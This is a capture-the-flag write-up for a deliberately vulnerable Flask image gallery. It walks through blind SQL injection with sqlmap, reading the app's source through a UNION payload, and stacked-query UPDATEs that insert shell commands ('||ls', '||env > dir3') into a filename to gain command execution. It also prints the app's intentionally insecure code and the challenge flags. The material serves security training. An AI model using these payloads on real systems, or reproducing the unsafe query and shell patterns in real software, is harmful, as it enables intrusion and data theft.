# Flag1
I tried to scan the application's directory with `dirb` and recevied nothing.
Look at the directory of pictures and there are `/fetch?id=`. I'll gain an image (unicode) if the direcotry is `True`
Change it to `/fetchh?id=1+and+1=1` will recevie a respectly image and `id=1+and+1=2` will receive a response. It's likely a SQLi vulnerablebility.
Try with `union` but failed again -> Bind SQLi
For convenience, I use `sqlmap` to exploit this endpoint
```
available databases [4]:
[*] information_schema
[*] level5
[*] mysql
[*] performance_schema
```
Continue exploit database `level5`
```
Database: level5
[2 tables]
+--------+
| albums |
| photos |
+--------+
```
Dump table `photos`
```
Database: level5
Table: photos
[3 entries]
+----+------------------+--------+------------------------------------------------------------------+
| id | title            | parent | filename                                                         |
+----+------------------+--------+------------------------------------------------------------------+
| 1  | Utterly adorable | 1      | files/adorable.jpg                                               |
| 2  | Purrfect         | 1      | files/purrfect.jpg                                               |
| 3  | Invisible        | 1      | 37f55cf2af9795c5b54ebc1ebb7238bc5617f6364fae7dd7d2078f91d9e3a232 |
+----+------------------+--------+------------------------------------------------------------------+
```
```python
Flag is : ^FLAG^37f55cf2af9795c5b54ebc1ebb7238bc5617f6364fae7dd7d2078f91d9e3a232$FLAG$
```

# Flag0
`Take a few minutes to consider the state of the union`
I tried to `union` with `number or string`, therefore I need a new one. That is an image with given `filename` from above tables.

`?id=12+union+select+'files/adorable.jpg'` -> rendered unicode of it

`This application runs on the uwsgi-nginx-flask-docker image` 
This is a problem when I don't have enough knowledge about docker.

Searching the source --> https://github.com/tiangolo/uwsgi-nginx-flask-docker and https://hub.docker.com/r/tiangolo/uwsgi-nginx-flask/
We got a file `uwsgi.ini` containing:
```
[uwsgi]
module = app.main
callable = app
```
Query to the file `main.py`
```http
GET /56cc8eba0e/fetch?id=1.1%20UNION%20SELECT%20'main.py'%20-- HTTP/1.1
```

And response is
```py
from flask import Flask, abort, redirect, request, Response
import base64, json, MySQLdb, os, re, subprocess

app = Flask(__name__)

home = '''
<!doctype html>
<html>
	<head>
		<title>Magical Image Gallery</title>
	</head>
	<body>
		<h1>Magical Image Gallery</h1>
$ALBUMS$
	</body>
</html>
'''

viewAlbum = '''
<!doctype html>
<html>
	<head>
		<title>$TITLE$ -- Magical Image Gallery</title>
	</head>
	<body>
		<h1>$TITLE$</h1>
$GALLERY$
	</body>
</html>
'''

def getDb():
	return MySQLdb.connect(host="localhost", user="root", password="", db="level5")

def sanitize(data):
	return data.replace('&', '&amp;').replace('<', '&lt;').replace('>', '&gt;').replace('"', '&quot;')

@app.route('/')
def index():
	cur = getDb().cursor()
	cur.execute('SELECT id, title FROM albums')
	albums = list(cur.fetchall())

	rep = ''
	for id, title in albums:
		rep += '<h2>%s</h2>\n' % sanitize(title)
		rep += '<div>'
		cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))
		fns = []
		for pid, ptitle, pfn in cur.fetchall():
			rep += '<div><img src="fetch?id=%i" width="266" height="150"><br>%s</div>' % (pid, sanitize(ptitle))
			fns.append(pfn)
		rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + f    n for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
		rep += '</div>\n'

	return home.replace('$ALBUMS$', rep)

@app.route('/fetch')
def fetch():
	cur = getDb().cursor()
	if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0:
		abort(404)

	# It's dangerous to go alone, take this:
	# ^FLAG^a746e1ffb76c74429047c658cb824effed8abf9e024b51beb7b8a2cb6569bfde$FLAG$

	return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read()

if __name__ == "__main__":
	app.run(host='0.0.0.0', port=80)
```

The flag
```py
Flag is : ^FLAG^a746e1ffb76c74429047c658cb824effed8abf9e024b51beb7b8a2cb6569bfde$FLAG$
```
# Flag2
Our hint is `That method of finding the size of an album seems suspicious`
Look at the code again, I doubt in thí code
```py
rep += '<i>Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '</i>'
```

The command is likely `du -ch filename || exit 0`. Think a little bit, we can inject command right here. Therefore, the neccessary is change the `filename` to append command or in another word, we need to edit the filename.
`Remember use Transaction in SQL to ensure the table is updated after execute`
- Firstly, try to change the third title to `test ne` (successful)
Query: 
```sql
id=1;UPDATE photos SET title='test ne' WHERE id=3;COMMIT;--+-
--> id=1%3bUPDATE%20photos%20SET%20title%3d'test%20ne'%20WHERE%2bid%3d3;COMMIT;--
```
- Secondly, change the `filename` to execute RCE
```sql
id=1;UPDATE photos SET filename='||ls' WHERE id=3;COMMIT;--+-
--> id=1%3bUPDATE%20photos%20SET%20filename%3d'||ls'%20WHERE%2bid%3d3;COMMIT;--
```
Response is: `Space used: uwsgi.ini`. It's likely we don't get all the directory. Try with pipeline to read the response
```sql
-- 1: use pipeline to save output
id=1%3bUPDATE%20photos%20SET%20filename%3d'%7c%7cls>dir'%20WHERE%20id%3d3%3bCOMMIT%3b--
-- 2: read response
id=1.1%20UNION%20SELECT%20'dir'%20--
-- Response is
Dockerfile
dir
files
main.py
main.pyc
prestart.sh
requirements.txt
uwsgi.ini
```
The problem is those don't contain the flag

Hint: `Be aware of your environment`
```sql
-- 3: catch env
id=1;UPDATE photos SET filename='||env > dir3' WHERE id=3;COMMIT;--
1;UPDATE photos SET filename='* || env > test' WHERE id=3;COMMIT;--
-- 4: read response
id=1.1 UNION SELECT 'dir3'--
```

```conf
...
SUPERVISOR_GROUP_NAME=uwsgi
FLAGS=["^FLAG^a746e1ffb76c74429047c658cb824effed8abf9e024b51beb7b8a2cb6569bfde$FLAG$", "^FLAG^37f55cf2af9795c5b54ebc1ebb7238bc5617f6364fae7dd7d2078f91d9e3a232$FLAG$", "^FLAG^66de579486bc4b81541f9cf8dd95d69bc8efa7c91f16a6851376aa0f5fe30464$FLAG$"]
OSTNAME=02c04ab79088
...
```
Submit the final flag 
```py
Flag is : ^FLAG^66de579486bc4b81541f9cf8dd95d69bc8efa7c91f16a6851376aa0f5fe30464$FLAG$
```